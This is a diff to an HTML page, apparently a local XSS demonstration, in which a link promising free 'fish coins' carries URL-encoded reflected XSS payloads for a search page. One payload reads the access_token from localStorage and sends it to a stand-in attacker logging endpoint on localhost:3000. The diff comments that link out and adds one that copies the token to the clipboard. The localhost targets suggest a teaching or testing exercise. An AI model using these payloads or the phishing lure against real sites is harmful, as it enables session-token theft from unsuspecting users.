@@ -57,12 +57,17 @@
 
         <!-- 
         <img src=x onerror="var t=localStorage.getItem('access_token'); alert('YOUR TOKEN HAS BEEN STOLEN: '+t); new Image().src='http://localhost:3000/attacker/log?token='+t">
+        
         <img src=x onerror="var t = localStorage.getItem('access_token');navigator.clipboard.writeText(t);document.body.innerHTML += '<p>Token copied to clipboard</p>';">
         -->
 
         <!-- 使用 https://www.urlencoder.org/ 將內容 encoder 成url可以解析 功能跳轉到原本登入網站在alert 出當前 token-->
 
-        <a href="http://localhost:5173/search?q=%20%20%20%20%20%20%20%20%3Cimg%20src%3Dx%20onerror%3D%22var%20t%3DlocalStorage.getItem%28%27access_token%27%29%3B%20alert%28%27YOUR%20TOKEN%20HAS%20BEEN%20STOLEN%3A%20%27%2Bt%29%3B%20new%20Image%28%29.src%3D%27http%3A%2F%2Flocalhost%3A3000%2Fattacker%2Flog%3Ftoken%3D%27%2Bt%22%3E"
+        <!-- <a href="http://localhost:5173/search?q=%20%20%20%20%20%20%20%20%3Cimg%20src%3Dx%20onerror%3D%22var%20t%3DlocalStorage.getItem%28%27access_token%27%29%3B%20alert%28%27YOUR%20TOKEN%20HAS%20BEEN%20STOLEN%3A%20%27%2Bt%29%3B%20new%20Image%28%29.src%3D%27http%3A%2F%2Flocalhost%3A3000%2Fattacker%2Flog%3Ftoken%3D%27%2Bt%22%3E"
+            class="claim-button">
+            立即領取魚幣
+        </a> -->
+        <a href="http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3D%22var%20t%20%3D%20localStorage.getItem%28%27access_token%27%29%3Bnavigator.clipboard.writeText%28t%29%3Bdocument.body.innerHTML%20%2B%3D%20%27%3Cp%3EToken%20copied%20to%20clipboard%3C%2Fp%3E%27%3B%22%3E"
             class="claim-button">
             立即領取魚幣
         </a>
